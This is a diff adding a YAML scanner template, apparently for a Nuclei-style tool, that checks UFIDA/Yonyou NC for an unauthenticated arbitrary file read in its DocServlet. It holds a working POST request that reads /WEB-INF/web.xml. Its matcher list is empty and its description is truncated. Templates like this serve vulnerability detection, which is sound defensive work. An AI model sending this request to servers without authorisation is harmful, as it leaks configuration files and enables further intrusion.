@@ -1,0 +1,18 @@
+id: yonyou-nc-lfi
+brief:
+    title: UFIDA NC - Arbitrary File Read
+    by: vva
+    level: high
+    about: UFIDA NC is vulnerable to an arbitrary file read vulnerability in the nc.uap.lfw.file.action.DocServlet component. An unauthenticated remote attacker can exploit this flaw to read sensitive files o...
+    label:
+        - yonyou
+        - ufida
+        - lfi
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/service/~webrt/nc.uap.lfw.file.action.DocServlet'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: pageId=login&disp=/WEB-INF/web.xml
+      signs: []
